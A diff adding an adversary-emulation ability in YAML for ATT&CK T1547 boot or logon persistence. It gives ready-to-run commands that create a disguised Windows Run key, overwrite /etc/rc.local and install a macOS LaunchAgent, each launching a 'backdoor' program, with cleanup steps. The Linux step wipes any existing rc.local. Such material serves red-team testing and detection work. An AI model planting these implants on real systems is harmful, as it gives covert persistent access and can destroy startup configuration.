@@ -1,0 +1,81 @@
+id: 9abcd123-4567-89de-abcd-123456789abc
+name: Persistence via Startup Implants
+description: Modify system startup processes to maintain persistent access on the compromised system.
+tactic: persistence
+technique:
+  attack_id: T1547
+  name: Boot or Logon Autostart Execution
+  reference: https://attack.mitre.org/techniques/T1547/
+platforms:
+  windows:
+    executor:
+      name: powershell
+      command: |
+        # Création d'une entrée de registre pour la persistance via l'éditeur de registre
+        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterService" -Value "C:\Users\Public\backdoor.exe"
+    cleanup: |
+      # Suppression de l'entrée de registre
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterService" -ErrorAction SilentlyContinue
+  linux:
+    executor:
+      name: sh
+      command: |
+        # Ajout d'une commande au fichier /etc/rc.local pour la persistance au démarrage
+        echo '#!/bin/bash' > /etc/rc.local
+        echo '/usr/local/bin/backdoor.sh &' >> /etc/rc.local
+        chmod +x /etc/rc.local
+    cleanup: |
+      # Suppression de l'entrée de démarrage
+      rm -f /etc/rc.local
+  macos:
+    executor:
+      name: sh
+      command: |
+        # Création d'un LaunchAgent pour la persistance sur macOS
+        PLIST_PATH="/Library/LaunchAgents/com.example.persistence.plist"
+        echo '<?xml version="1.0" encoding="UTF-8"?>' > $PLIST_PATH
+        echo '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">' >> $PLIST_PATH
+        echo '<plist version="1.0">' >> $PLIST_PATH
+        echo '<dict>' >> $PLIST_PATH
+        echo '  <key>Label</key>' >> $PLIST_PATH
+        echo '  <string>com.example.persistence</string>' >> $PLIST_PATH
+        echo '  <key>ProgramArguments</key>' >> $PLIST_PATH
+        echo '  <array>' >> $PLIST_PATH
+        echo '    <string>/usr/local/bin/backdoor.sh</string>' >> $PLIST_PATH
+        echo '  </array>' >> $PLIST_PATH
+        echo '  <key>RunAtLoad</key>' >> $PLIST_PATH
+        echo '  <true/>' >> $PLIST_PATH
+        echo '</dict>' >> $PLIST_PATH
+        echo '</plist>' >> $PLIST_PATH
+        launchctl load $PLIST_PATH
+    cleanup: |
+      # Suppression de l'agent de persistance sur macOS
+      launchctl unload /Library/LaunchAgents/com.example.persistence.plist
+      rm -f /Library/LaunchAgents/com.example.persistence.plist
+
+# Les conditions de succès de l'attaque
+requirements:
+  - name: powershell
+    type: binary
+  - name: bash
+    type: binary
+  - name: launchctl
+    type: binary
+
+# Indicateurs de succès
+privilege:
+  escalation: false
+  persistence: true
+
+# Métadonnées
+metadata:
+  author: Cybersecurity Analyst
+  creation_date: 2024-12-10
+  mitre_techniques:
+    - T1547
+  tags:
+    - persistence
+    - boot-implant
+    - startup-persistence
+    - mitre-attack
